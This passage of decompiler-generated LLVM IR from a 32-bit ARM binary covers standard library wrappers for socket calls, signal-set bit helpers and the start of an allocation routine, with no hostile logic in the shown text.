  %v3_12268 = load i32, i32* @r4, align 4
  store i32 %v3_12268, i32* %stack_var_-8, align 4
  %v5_1226c = inttoptr i32 %arg3 to i32*
  %v6_1226c = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_1226c)
  store i32 %v6_1226c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_1226c, -4095
  br i1 %tmp, label %dec_label_pc_1228c, label %dec_label_pc_1227c

dec_label_pc_1227c:                               ; preds = %dec_label_pc_12268
  %v0_1227c = call i32 @function_120c4()
  %v0_12280 = load i32, i32* %r4.global-to-local, align 4
  %v1_12280 = sub i32 0, %v0_12280
  %v2_12284 = inttoptr i32 %v0_1227c to i32*
  store i32 %v1_12280, i32* %v2_12284, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1228c

dec_label_pc_1228c:                               ; preds = %dec_label_pc_12268, %dec_label_pc_1227c
  %v0_1228c = phi i32 [ %v6_1226c, %dec_label_pc_12268 ], [ -1, %dec_label_pc_1227c ]
  %v2_12290 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12290, i32* @r4, align 4
  ret i32 %v0_1228c

; uselistorder directives
  uselistorder i32 %v6_1226c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1228c, { 1, 0 }
}

define i32 @function_12294(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12294:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12294 = load i32, i32* @r4, align 4
  store i32 %v3_12294, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_1229c = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  store i32 %v5_1229c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1229c, -4095
  br i1 %tmp, label %dec_label_pc_122bc, label %dec_label_pc_122ac

dec_label_pc_122ac:                               ; preds = %dec_label_pc_12294
  %v0_122ac = call i32 @function_120c4()
  %v0_122b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_122b0 = sub i32 0, %v0_122b0
  %v2_122b4 = inttoptr i32 %v0_122ac to i32*
  store i32 %v1_122b0, i32* %v2_122b4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122bc

dec_label_pc_122bc:                               ; preds = %dec_label_pc_12294, %dec_label_pc_122ac
  %v0_122bc = phi i32 [ %v5_1229c, %dec_label_pc_12294 ], [ -1, %dec_label_pc_122ac ]
  %v2_122c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_122c0, i32* @r4, align 4
  ret i32 %v0_122bc

; uselistorder directives
  uselistorder i32 %v5_1229c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_122bc, { 1, 0 }
}

define i32 @function_122c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_122c4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122c4 = load i32, i32* @r4, align 4
  store i32 %v3_122c4, i32* %stack_var_-8, align 4
  %v2_122c8 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_122c8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_122c8, -4095
  br i1 %tmp, label %dec_label_pc_122e8, label %dec_label_pc_122d8

dec_label_pc_122d8:                               ; preds = %dec_label_pc_122c4
  %v0_122d8 = call i32 @function_120c4()
  %v0_122dc = load i32, i32* %r4.global-to-local, align 4
  %v1_122dc = sub i32 0, %v0_122dc
  %v2_122e0 = inttoptr i32 %v0_122d8 to i32*
  store i32 %v1_122dc, i32* %v2_122e0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122e8

dec_label_pc_122e8:                               ; preds = %dec_label_pc_122c4, %dec_label_pc_122d8
  %v0_122e8 = phi i32 [ %v2_122c8, %dec_label_pc_122c4 ], [ -1, %dec_label_pc_122d8 ]
  %v2_122ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_122ec, i32* @r4, align 4
  ret i32 %v0_122e8

; uselistorder directives
  uselistorder i32 %v2_122c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_122e8, { 1, 0 }
}

define i32 @function_122f0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_122f0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122f0 = load i32, i32* @r4, align 4
  store i32 %v3_122f0, i32* %stack_var_-8, align 4
  %v5_122f4 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_122f4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_122f4, -4095
  br i1 %tmp, label %dec_label_pc_12314, label %dec_label_pc_12304

dec_label_pc_12304:                               ; preds = %dec_label_pc_122f0
  %v0_12304 = call i32 @function_120c4()
  %v0_12308 = load i32, i32* %r4.global-to-local, align 4
  %v1_12308 = sub i32 0, %v0_12308
  %v2_1230c = inttoptr i32 %v0_12304 to i32*
  store i32 %v1_12308, i32* %v2_1230c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %dec_label_pc_122f0, %dec_label_pc_12304
  %v0_12314 = phi i32 [ %v5_122f4, %dec_label_pc_122f0 ], [ -1, %dec_label_pc_12304 ]
  %v2_12318 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12318, i32* @r4, align 4
  ret i32 %v0_12314

; uselistorder directives
  uselistorder i32 %v5_122f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12314, { 1, 0 }
}

define i32 @function_1231c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1231c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1231c = load i32, i32* @r4, align 4
  store i32 %v3_1231c, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_12328 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  store i32 %v5_12328, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12328, -4095
  br i1 %tmp, label %dec_label_pc_12348, label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %dec_label_pc_1231c
  %v0_12338 = call i32 @function_120c4()
  %v0_1233c = load i32, i32* %r4.global-to-local, align 4
  %v1_1233c = sub i32 0, %v0_1233c
  %v2_12340 = inttoptr i32 %v0_12338 to i32*
  store i32 %v1_1233c, i32* %v2_12340, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_1231c, %dec_label_pc_12338
  %v0_12348 = phi i32 [ %v5_12328, %dec_label_pc_1231c ], [ -1, %dec_label_pc_12338 ]
  %v2_1234c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1234c, i32* @r4, align 4
  ret i32 %v0_12348

; uselistorder directives
  uselistorder i32 %v5_12328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12348, { 1, 0 }
}

define i32 @function_12350(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12350:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12350 = load i32, i32* @r4, align 4
  store i32 %v3_12350, i32* %stack_var_-8, align 4
  %v5_12354 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12354, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12354, -4095
  br i1 %tmp, label %dec_label_pc_12374, label %dec_label_pc_12364

dec_label_pc_12364:                               ; preds = %dec_label_pc_12350
  %v0_12364 = call i32 @function_120c4()
  %v0_12368 = load i32, i32* %r4.global-to-local, align 4
  %v1_12368 = sub i32 0, %v0_12368
  %v2_1236c = inttoptr i32 %v0_12364 to i32*
  store i32 %v1_12368, i32* %v2_1236c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12374

dec_label_pc_12374:                               ; preds = %dec_label_pc_12350, %dec_label_pc_12364
  %v0_12374 = phi i32 [ %v5_12354, %dec_label_pc_12350 ], [ -1, %dec_label_pc_12364 ]
  %v2_12378 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12378, i32* @r4, align 4
  ret i32 %v0_12374

; uselistorder directives
  uselistorder i32 %v5_12354, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12374, { 1, 0 }
}

define i32 @function_1237c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1237c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_12388 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_12388, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12388, -4095
  br i1 %tmp, label %dec_label_pc_123a8, label %dec_label_pc_12398

dec_label_pc_12398:                               ; preds = %dec_label_pc_1237c
  %v0_12398 = call i32 @function_120c4()
  %v0_1239c = load i32, i32* %r4.global-to-local, align 4
  %v1_1239c = sub i32 0, %v0_1239c
  %v2_123a0 = inttoptr i32 %v0_12398 to i32*
  store i32 %v1_1239c, i32* %v2_123a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123a8

dec_label_pc_123a8:                               ; preds = %dec_label_pc_1237c, %dec_label_pc_12398
  %v0_123a8 = phi i32 [ %v5_12388, %dec_label_pc_1237c ], [ -1, %dec_label_pc_12398 ]
  ret i32 %v0_123a8

; uselistorder directives
  uselistorder i32 %v5_12388, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123a8, { 1, 0 }
}

define i32 @function_123b0(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_123b0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123b0 = load i32, i32* @r4, align 4
  store i32 %v3_123b0, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_123b8 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_123b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_123b8, -4095
  br i1 %tmp, label %dec_label_pc_123d8, label %dec_label_pc_123c8

dec_label_pc_123c8:                               ; preds = %dec_label_pc_123b0
  %v0_123c8 = call i32 @function_120c4()
  %v0_123cc = load i32, i32* %r4.global-to-local, align 4
  %v1_123cc = sub i32 0, %v0_123cc
  %v2_123d0 = inttoptr i32 %v0_123c8 to i32*
  store i32 %v1_123cc, i32* %v2_123d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123b0, %dec_label_pc_123c8
  %v0_123d8 = phi i32 [ %v5_123b8, %dec_label_pc_123b0 ], [ -1, %dec_label_pc_123c8 ]
  %v2_123dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_123dc, i32* @r4, align 4
  ret i32 %v0_123d8

; uselistorder directives
  uselistorder i32 %v5_123b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123d8, { 1, 0 }
}

define i32 @function_123e0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_123e0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123e0 = load i32, i32* @r4, align 4
  store i32 %v3_123e0, i32* %stack_var_-8, align 4
  %v3_123e4 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_123e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_123e4, -4095
  br i1 %tmp, label %dec_label_pc_12404, label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123e0
  %v0_123f4 = call i32 @function_120c4()
  %v0_123f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_123f8 = sub i32 0, %v0_123f8
  %v2_123fc = inttoptr i32 %v0_123f4 to i32*
  store i32 %v1_123f8, i32* %v2_123fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %dec_label_pc_123e0, %dec_label_pc_123f4
  %v0_12404 = phi i32 [ %v3_123e4, %dec_label_pc_123e0 ], [ -1, %dec_label_pc_123f4 ]
  %v2_12408 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12408, i32* @r4, align 4
  ret i32 %v0_12404

; uselistorder directives
  uselistorder i32 %v3_123e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12404, { 1, 0 }
}

define i32 @function_1240c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1240c:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_12428, label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %dec_label_pc_1240c
  %v8_1241c = icmp sgt i32 %arg1, 64
  br i1 %v8_1241c, label %dec_label_pc_12428, label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %dec_label_pc_12418
  %v0_12424 = call i32 @function_12530()
  br label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %dec_label_pc_12418, %dec_label_pc_1240c, %dec_label_pc_12420
  %v0_12428 = call i32 @function_120c4()
  %v2_12430 = inttoptr i32 %v0_12428 to i32*
  store i32 22, i32* %v2_12430, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12428, { 2, 0, 1 }
}

define i32 @function_1243c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1243c:
  store i32 128, i32* @r2, align 4
  %v0_12448 = load i32, i32* @r0, align 4
  %v2_12448 = inttoptr i32 %v0_12448 to i8*
  %v3_12448 = call i32 @function_12130(i8* %v2_12448, i32 0)
  ret i32 0
}

define i32 @function_12454(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12454:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12454 = load i32, i32* @r4, align 4
  store i32 %v3_12454, i32* %stack_var_-12, align 4
  %v6_12454 = load i32, i32* @r5, align 4
  %v10_12454 = ptrtoint i32* %stack_var_-12 to i32
  %v7_12458 = icmp eq i32 %arg2, -1
  %v0_12464.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_12458, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12454
  br label %dec_label_pc_1247c

bb:                                               ; preds = %dec_label_pc_12454
  %v2_12460 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_12464.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_12464.pre, 1
  br i1 %tmp19, label %dec_label_pc_1247c, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %bb
  %v7_12470 = icmp sgt i32 %v0_12464.pre, 64
  br i1 %v7_12470, label %dec_label_pc_1247c, label %bb20

bb20:                                             ; preds = %dec_label_pc_1246c
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_124a024 = add i32 %v10_12454, 124
  store i32 %v5_124a024, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12490

dec_label_pc_1247c:                               ; preds = %.thread, %dec_label_pc_1246c, %bb
  %v0_1247c = call i32 @function_120c4()
  store i32 %v0_1247c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12488 = inttoptr i32 %v0_1247c to i32*
  store i32 22, i32* %v2_12488, align 4
  %v0_124fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_124fc

dec_label_pc_12490:                               ; preds = %bb20, %dec_label_pc_12490
  %v5_124a025 = phi i32 [ %v5_124a024, %bb20 ], [ %v5_124a0, %dec_label_pc_12490 ]
  %v2_12494 = add i32 %v5_124a025, -136
  %v3_12494 = inttoptr i32 %v2_12494 to i32*
  store i32 0, i32* %v3_12494, align 4
  %v0_12498.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_12498 = add i32 %v0_12498.pre, -1
  store i32 %v1_12498, i32* %r0.global-to-local, align 4
  %v6_12498 = icmp slt i32 %v1_12498, 0
  %v4_124a0 = mul i32 %v1_12498, 4
  %v5_124a0 = add i32 %v4_124a0, %v10_12454
  store i32 %v5_124a0, i32* %r2.global-to-local, align 4
  br i1 %v6_12498, label %dec_label_pc_124a8, label %dec_label_pc_12490

dec_label_pc_124a8:                               ; preds = %dec_label_pc_12490
  %v2_124a8 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_124a8, i32* @r5, align 4
  %v2_124ac = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_124ac, i32* @r0, align 4
  %v0_124b0 = load i32, i32* @r4, align 4
  store i32 %v0_124b0, i32* @r1, align 4
  %v0_124b4 = call i32 @function_12530()
  store i32 %v0_124b4, i32* %r0.global-to-local, align 4
  %v1_124b8 = icmp slt i32 %v0_124b4, 0
  br i1 %v1_124b8, label %dec_label_pc_124f8, label %dec_label_pc_124c0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_124a8
  %v0_124c0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1cc40.388 to i32), i32* %r0.global-to-local, align 4
  %v2_124c8 = call i32 @function_1250c(i32 ptrtoint (i32* @global_var_1cc40.388 to i32), i32 %v0_124c0)
  store i32 %v2_12460, i32* %r2.global-to-local, align 4
  %v0_124e0 = load i32, i32* @r4, align 4
  store i32 %v0_124e0, i32* %r0.global-to-local, align 4
  %v4_124e8 = call i32 @function_133f8(i32 %v0_124e0, i32* nonnull %stack_var_-152, i32 %v2_12460)
  store i32 %v4_124e8, i32* %r0.global-to-local, align 4
  %v1_124ec = icmp slt i32 %v4_124e8, 0
  br i1 %v1_124ec, label %dec_label_pc_124f8, label %bb23

bb23:                                             ; preds = %dec_label_pc_124c0
  %v5_124f0 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_124f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_124fc

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124c0, %dec_label_pc_124a8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_124fc

dec_label_pc_124fc:                               ; preds = %bb23, %dec_label_pc_1247c, %dec_label_pc_124f8
  %v0_124fc = phi i32 [ %v5_124f0, %bb23 ], [ %v0_124fc.pre, %dec_label_pc_1247c ], [ -1, %dec_label_pc_124f8 ]
  store i32 %v0_124fc, i32* %r0.global-to-local, align 4
  %v2_12504 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12504, i32* @r4, align 4
  store i32 %v6_12454, i32* @r5, align 4
  ret i32 %v0_124fc

; uselistorder directives
  uselistorder i32 %v0_124fc, { 1, 0 }
  uselistorder i32 %v5_124a0, { 1, 0 }
  uselistorder i32 %v1_12498, { 0, 2, 1 }
  uselistorder i32 %v2_12460, { 1, 0 }
  uselistorder i32 %v0_12464.pre, { 1, 0, 2 }
  uselistorder i32 %v10_12454, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_124fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12490, { 1, 0 }
  uselistorder label %dec_label_pc_1247c, { 1, 2, 0 }
}

define i32 @function_1250c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1250c:
  %v1_1250c = add i32 %arg2, -1
  %v3_12510 = udiv i32 %v1_1250c, 32
  %v4_12514 = mul nuw nsw i32 %v3_12510, 4
  %v5_12514 = add i32 %v4_12514, %arg1
  %v6_12514 = inttoptr i32 %v5_12514 to i32*
  %v7_12514 = load i32, i32* %v6_12514, align 4
  %v1_12518 = urem i32 %v1_1250c, 32
  %v7_12520 = shl i32 1, %v1_12518
  %v8_12520 = and i32 %v7_12514, %v7_12520
  %v10_12520 = icmp ne i32 %v8_12520, 0
  %. = zext i1 %v10_12520 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1250c, { 1, 0 }
}

define i32 @function_12530() local_unnamed_addr {
dec_label_pc_12530:
  %v0_12530 = load i32, i32* @r1, align 4
  %v1_12530 = add i32 %v0_12530, -1
  %v3_12534 = udiv i32 %v1_12530, 32
  store i32 %v3_12534, i32* @ip, align 4
  %v0_12538 = load i32, i32* @r0, align 4
  %v4_12538 = mul nuw nsw i32 %v3_12534, 4
  %v5_12538 = add i32 %v0_12538, %v4_12538
  %v6_12538 = inttoptr i32 %v5_12538 to i32*
  %v7_12538 = load i32, i32* %v6_12538, align 4
  %v1_1253c = urem i32 %v1_12530, 32
  %v7_12544 = shl i32 1, %v1_1253c
  %v8_12544 = or i32 %v7_12538, %v7_12544
  store i32 %v8_12544, i32* %v6_12538, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12534, { 1, 0 }
  uselistorder i32 %v1_12530, { 1, 0 }
}

define i32 @function_12554(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12554:
  %v1_12554 = add i32 %arg2, -1
  %v3_12558 = udiv i32 %v1_12554, 32
  %v4_1255c = mul nuw nsw i32 %v3_12558, 4
  %v5_1255c = add i32 %v4_1255c, %arg1
  %v6_1255c = inttoptr i32 %v5_1255c to i32*
  %v7_1255c = load i32, i32* %v6_1255c, align 4
  %v1_12560 = urem i32 %v1_12554, 32
  %tmp = shl i32 -1, %v1_12560
  %v8_12568 = add i32 %tmp, -1
  %v9_12568 = and i32 %v7_1255c, %v8_12568
  store i32 %v9_12568, i32* %v6_1255c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12554, { 1, 0 }
}

define i32 @function_12578(i32 %arg1) local_unnamed_addr {
dec_label_pc_12578:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12578 = load i32, i32* @r4, align 4
  %v6_12578 = load i32, i32* @r5, align 4
  %v9_12578 = load i32, i32* @r6, align 4
  %v0_1257c = load i32, i32* %r0.global-to-local, align 4
  %v2_1257c = icmp eq i32 %v0_1257c, 0
  %v2_12580 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_1257c, label %bb, label %dec_label_pc_1258c

bb:                                               ; preds = %dec_label_pc_12578
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12594

dec_label_pc_1258c:                               ; preds = %dec_label_pc_12578
  %tmp = icmp ugt i32 %v0_1257c, -8
  br i1 %tmp, label %dec_label_pc_12698, label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %bb, %dec_label_pc_1258c
  %v0_12594 = phi i32 [ %v0_1257c, %dec_label_pc_1258c ], [ 1, %bb ]
  %v1_12594 = add i32 %v0_12594, 4
  store i32 %v1_12594, i32* %stack_var_-20, align 4
  store i32 %v2_12580, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1cad8.390 to i32), i32* %r0.global-to-local, align 4
  %v1_125ac = call i32 @function_1310c()
  store i32 ptrtoint (i32** @global_var_1c91c.394 to i32), i32* %r0.global-to-local, align 4
  %v3_125b8 = call i32 @function_1292c(i32* bitcast (i32** @global_var_1c91c.394 to i32*), i32 %v2_12580)
  store i32 %v3_125b8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cad8.390 to i32), i32* %r0.global-to-local, align 4
  store i32 75216, i32* @lr, align 4
  %v1_125cc = call i32 @function_1310c()
  store i32 %v1_125cc, i32* %r0.global-to-local, align 4
  %v2_125d0 = icmp eq i32 %v3_125b8, 0
  br i1 %v2_125d0, label %dec_label_pc_125d8, label %dec_label_pc_12688

dec_label_pc_125d8:                               ; preds = %dec_label_pc_12594
  %v2_125dc = load i32, i32* @global_var_1cb00.397, align 4
  store i32 %v2_125dc, i32* @r4, align 4
  %v2_125e0 = load i32, i32* %stack_var_-20, align 4
  %v3_125e4 = icmp ult i32 %v2_125e0, %v2_125dc
  br i1 %v3_125e4, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_125d8
  %v3_125e8 = add i32 %v2_125dc, -1
  %v2_125ec = add i32 %v3_125e8, %v2_125e0
  %v2_125f0 = sub i32 0, %v2_125dc
  %v3_125f4 = and i32 %v2_125ec, %v2_125f0
  store i32 %v3_125f4, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_125d8, %bb14
  store i32 ptrtoint (i32* @global_var_1ccc0.399 to i32), i32* %r0.global-to-local, align 4
  %v1_12600 = call i32 @function_1310c()
  %v0_12604 = load i32, i32* @r4, align 4
  store i32 %v0_12604, i32* %r0.global-to-local, align 4
  %v1_12608 = call i32 @function_138c0(i32 %v0_12604)
  store i32 %v1_12608, i32* %r0.global-to-local, align 4
  %v7_1260c = icmp eq i32 %v1_12608, -1
  br i1 %v7_1260c, label %bb15, label %dec_label_pc_12618

bb15:                                             ; preds = %.thread3
  store i32 %v1_12608, i32* @r5, align 4
  br label %dec_label_pc_1262c

dec_label_pc_12618:                               ; preds = %.thread3
  %v1_12618 = add i32 %v1_12608, 3
  %v1_1261c = and i32 %v1_12618, -4
  store i32 %v1_1261c, i32* @r5, align 4
  %v9_12620 = icmp eq i32 %v1_1261c, %v1_12608
  br i1 %v9_12620, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_12618
  %v3_12624 = sub i32 %v1_1261c, %v1_12608
  store i32 %v3_12624, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12618, %bb16
  %v1_12628 = xor i1 %v9_12620, true
  call void @__pseudo_cond_branch(i1 %v1_12628, i32 ptrtoint (i32* @global_var_138c0.400 to i32))
  br label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1ccc0.399 to i32), i32* %r0.global-to-local, align 4
  store i32 75324, i32* @lr, align 4
  %v1_12638 = call i32 @function_1310c()
  store i32 %v1_12638, i32* %r0.global-to-local, align 4
  %v0_1263c = load i32, i32* @r5, align 4
  %v7_1263c = icmp eq i32 %v0_1263c, -1
  br i1 %v7_1263c, label %dec_label_pc_12698, label %dec_label_pc_12644

dec_label_pc_12644:                               ; preds = %dec_label_pc_1262c
  store i32 ptrtoint (i32* @global_var_1cad8.390 to i32), i32* %r0.global-to-local, align 4
  %v1_12650 = call i32 @function_1310c()
  %v0_12654 = load i32, i32* @r4, align 4
  %v0_12658 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1c91c.394 to i32), i32* %r0.global-to-local, align 4
  %v4_12660 = call i32 @function_12a80(i32* bitcast (i32** @global_var_1c91c.394 to i32*), i32 %v0_12658, i32 %v0_12654)
  store i32 ptrtoint (i32** @global_var_1c91c.394 to i32), i32* %r0.global-to-local, align 4
  %v3_1266c = call i32 @function_1292c(i32* bitcast (i32** @global_var_1c91c.394 to i32*), i32 %v2_12580)
  store i32 %v3_1266c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cad8.390 to i32), i32* %r0.global-to-local, align 4
  store i32 75392, i32* @lr, align 4
  %v1_1267c = call i32 @function_1310c()
  store i32 %v1_1267c, i32* %r0.global-to-local, align 4
  %v2_12680 = icmp eq i32 %v3_1266c, 0
  br i1 %v2_12680, label %dec_label_pc_12698, label %dec_label_pc_12688

dec_label_pc_12688:                               ; preds = %dec_label_pc_12594, %dec_label_pc_12644
  %v1_1268c = phi i32 [ %v3_125b8, %dec_label_pc_12594 ], [ %v3_1266c, %dec_label_pc_12644 ]
  %v2_12688 = load i32, i32* %stack_var_-20, align 4
  %v2_1268c = inttoptr i32 %v1_1268c to i32*
  store i32 %v2_12688, i32* %v2_1268c, align 4
  %v3_1268c = load i32, i32* %r4.global-to-local, align 4
  %v4_1268c = add i32 %v3_1268c, 4
  store i32 %v4_1268c, i32* %r4.global-to-local, align 4
  %v2_12690 = icmp eq i32 %v4_1268c, 0
  br i1 %v2_12690, label %dec_label_pc_12698, label %dec_label_pc_126a8

dec_label_pc_12698:                               ; preds = %dec_label_pc_12688, %dec_label_pc_12644, %dec_label_pc_1262c, %dec_label_pc_1258c
  %v0_12698 = call i32 @function_120c4()
  store i32 %v0_12698, i32* %r0.global-to-local, align 4
  %v2_126a0 = inttoptr i32 %v0_12698 to i32*
  store i32 12, i32* %v2_126a0, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_126a8

dec_label_pc_126a8:                               ; preds = %dec_label_pc_12688, %dec_label_pc_12698
